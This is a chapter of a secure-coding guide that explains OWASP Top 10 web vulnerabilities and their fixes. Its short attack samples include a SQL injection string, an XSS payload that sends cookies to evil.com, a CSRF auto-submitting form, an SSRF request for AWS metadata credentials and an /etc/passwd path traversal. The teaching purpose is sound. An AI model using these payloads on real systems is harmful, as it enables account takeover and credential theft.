# 5. Secure Coding & the OWASP Top 10

The OWASP Top 10 is a ranked list of the most common, most impactful web application
vulnerabilities, maintained from real-world breach data. It's not exhaustive, but if you can
explain *why* each of these works and *why* the fix stops it, you're ahead of most engineers.

## 5.1 Injection (SQL, NoSQL, OS command, LDAP)

**Why it works:** user input is concatenated directly into a command interpreter (a SQL query, a
shell command) instead of being kept separate from the command's *structure*. The interpreter
can't tell "data" from "code" if you hand it a single string that's both.

```sql
-- Naive, vulnerable:
"SELECT * FROM users WHERE username = '" + input + "'"

-- Attacker sends: input = "' OR '1'='1"
-- Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'
-- Returns every row. Worse inputs drop tables, exfiltrate data via UNION SELECT, etc.
```

**The fix — parameterized queries / prepared statements** — is not "escape the quotes better." It
sends the query structure and the data as two separate things over the wire to the database
driver, so the data can *never* be reinterpreted as SQL syntax, no matter what characters it
contains:

```csharp
// Safe: data and query structure are sent separately
cmd.CommandText = "SELECT * FROM users WHERE username = @username";
cmd.Parameters.AddWithValue("@username", input);
```

Every ORM (EF Core, Dapper with parameters, Sequelize, ActiveRecord) does this by default when used
correctly — the vulnerability almost always comes from someone dropping down to raw string
concatenation "just this once" for a dynamic query. **The same principle applies to OS command
execution** (use an argument array, never build a shell string) and **LDAP queries** (escape
per the LDAP-specific rules, or use a query-builder API).

## 5.2 Cross-Site Scripting (XSS)

**Why it works:** user-controlled data is rendered into an HTML page without encoding, so if it
contains `<script>` or an event handler attribute, the browser executes it as code, in the
security context of your site — meaning it can read cookies (unless `HttpOnly`), make authenticated
requests as the victim, or rewrite the page entirely.

```html
<!-- Vulnerable: comment field rendered raw -->
<div>{{ user_comment }}</div>
<!-- Attacker's comment: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"> -->
```

**Three variants, three different fixes:**
- **Stored XSS** — the payload is saved server-side (a comment, a profile field) and served to
  every future viewer. Highest impact.
- **Reflected XSS** — the payload comes from the current request (a query param echoed into an
  error page) and only fires for whoever clicks a crafted link.
- **DOM-based XSS** — the vulnerability is entirely client-side: JavaScript reads something
  attacker-controlled (`location.hash`, a URL param) and writes it into the DOM via `innerHTML` or
  similar, with no server involvement at all.

**The fix:** context-appropriate output encoding, every time user data is rendered — HTML-encode
for HTML body content, attribute-encode for attribute values, JS-string-encode for embedding in a
`<script>` block (better: don't embed user data in inline script at all). Modern frameworks (React,
Vue, Angular) auto-encode by default when you use their templating — the vulnerability shows up
almost exclusively when a developer explicitly opts out (`dangerouslySetInnerHTML` in React,
`v-html` in Vue, `[innerHTML]` in Angular) for "just this one case" without sanitizing first.
**Content-Security-Policy (CSP)** headers are a critical defense-in-depth layer here — even if an
XSS payload gets injected, a strict CSP (`script-src 'self'`, no `unsafe-inline`) can prevent it
from executing at all.

## 5.3 Cross-Site Request Forgery (CSRF)

**Why it works:** browsers automatically attach cookies to every request to a domain, regardless
of which page initiated the request. If your bank's "transfer money" endpoint only checks "is
there a valid session cookie," a malicious page you visit can submit a form (or fire a fetch) to
that endpoint, the browser helpfully attaches your real session cookie, and the bank's server sees
what looks like a legitimate authenticated request — because, from the cookie's perspective, it
is. The attacker never sees your cookie or your session; they just ride on it.

```html
<!-- On evil.com, visited while you're logged into bank.com in another tab -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>
```

**Fixes, from strongest baseline to defense-in-depth:**
- **`SameSite=Lax` or `Strict` cookies** — tells the browser not to send this cookie on
  cross-site requests at all. `Lax` (the modern default in Chrome/Firefox) still allows top-level
  navigation (clicking a link) to send the cookie but blocks it on cross-site POSTs/forms/fetches
  — this alone stops most CSRF.
- **CSRF tokens** — a random, unpredictable token embedded in the form/page, submitted back with
  the request and validated server-side. An attacker's cross-site form can't know this token
  (it's not in a cookie, so the browser doesn't auto-attach it), so a forged submission fails
  validation. Still recommended even with `SameSite` cookies as defense-in-depth, especially for
  state-changing GET-adjacent actions or older browser support.
- Note: **this is specifically a cookie-based-auth problem.** APIs authenticated via a bearer
  token sent in an `Authorization` header (not a cookie) are not vulnerable to classic CSRF,
  because the browser doesn't auto-attach headers the way it auto-attaches cookies — a
  cross-site page has no way to make the victim's browser send that header. This is one real
  argument in favor of header-based tokens over cookies for pure APIs (though it reopens the XSS
  token-theft question — see [06](06-session-and-token-security.md)).

## 5.4 Server-Side Request Forgery (SSRF)

**Why it works:** the server fetches a URL that's fully or partially attacker-controlled (an
"import from URL," a webhook callback, an image-proxy feature), and the attacker points it at a
resource the *server* can reach but *they* can't directly — most commonly a cloud metadata
endpoint (`http://169.254.169.254/latest/meta-data/iam/...` on AWS) that hands out temporary cloud
credentials to anything that asks from inside the VPC, no authentication required, by design. This
turns a "fetch this image" feature into "steal this server's cloud IAM credentials."

```
POST /api/import-avatar
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role" }
```

**Fixes:**
- Never let user input directly determine the destination of a server-initiated request without
  validation. Validate against an **allowlist** of expected hosts/schemes, not a denylist (denylists
  miss encoding tricks — `http://0x7f000001/`, `http://[::ffff:127.0.0.1]/`, DNS rebinding, open
  redirects used as a bounce).
- Block requests to link-local/private IP ranges (`169.254.0.0/16`, `10.0.0.0/8`,
  `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`) at the network layer if the feature has no
  legitimate reason to reach them.
- Prefer IMDSv2 (AWS) or equivalent, which requires a session token obtained via a PUT request —
  something a simple SSRF-via-GET usually can't replicate — over the legacy metadata service.

## 5.5 Insecure Deserialization

**Why it works:** some serialization formats (Java's native serialization, Python's `pickle`, PHP's
`unserialize`, .NET's `BinaryFormatter`) can reconstruct arbitrary object graphs from a byte
stream, and reconstructing certain objects can trigger code execution as a side effect (e.g. a
class whose constructor or a "magic method" does something dangerous with attacker-controlled
field values). Deserializing untrusted data with these formats is functionally close to `eval()`
on attacker input.

**Fix:** don't deserialize untrusted data with formats capable of arbitrary object
reconstruction. Prefer data-only formats (JSON, with a schema validator) for anything crossing a
trust boundary. .NET's `BinaryFormatter` is now explicitly documented by Microsoft as unsafe and
being removed; if you see it in a codebase accepting external input, that's a serious finding.

## 5.6 Path Traversal

**Why it works:** a filename or path is taken from user input and used to build a filesystem path
without validation, and the input contains `../` sequences to escape the intended directory.

```
GET /download?file=../../../../etc/passwd
```

**Fix:** resolve the final absolute path and verify it's still inside the intended base directory
(`Path.GetFullPath` + a prefix check, not just stripping `../` substrings, which URL-encoding
tricks and double-encoding can bypass) — or better, don't accept a raw filesystem path from the
user at all; use an opaque ID that maps to a known file server-side.

## 5.7 Security Misconfiguration

The Top 10's catch-all for "the code was fine, the deployment wasn't": default credentials left
enabled, verbose stack traces/error details exposed to end users in production (leaking framework
versions, file paths, sometimes connection strings), directory listing enabled on a static file
server, unnecessary services/ports exposed, permissive CORS (`Access-Control-Allow-Origin: *`
combined with credentialed requests — never pair a wildcard origin with
`Access-Control-Allow-Credentials: true`; browsers actually block that combination, but a
misconfigured server that dynamically reflects any `Origin` header back is functionally identical
and browsers do allow that). Fix: hardened, reviewed default configs; environment-specific error
handling (detailed errors in dev, generic messages + server-side logging in production).

## 5.8 Vulnerable and Outdated Components

Using a dependency with a known CVE is, functionally, choosing to ship a known vulnerability.
Covered in depth in [10](10-infrastructure-and-supply-chain.md) — the short version: automated
dependency scanning (Dependabot, `npm audit`, `dotnet list package --vulnerable`, Snyk) in CI,
treated as a build-breaking finding for anything above a defined severity, not an occasional manual
check.

## 5.9 Broken Access Control (IDOR)

Covered conceptually in [02](02-authorization.md) — the concrete bug pattern: an endpoint accepts
an object ID (`/api/invoices/1234`) and returns/modifies that object based purely on "does this ID
exist," without checking "does the *currently authenticated user* actually own or have permission
over object `1234`." Consistently one of the most common real-world findings in penetration tests,
because it's easy to write, easy to miss in review (the happy path — your own ID — works fine),
and trivial to exploit (just change the number in the URL).
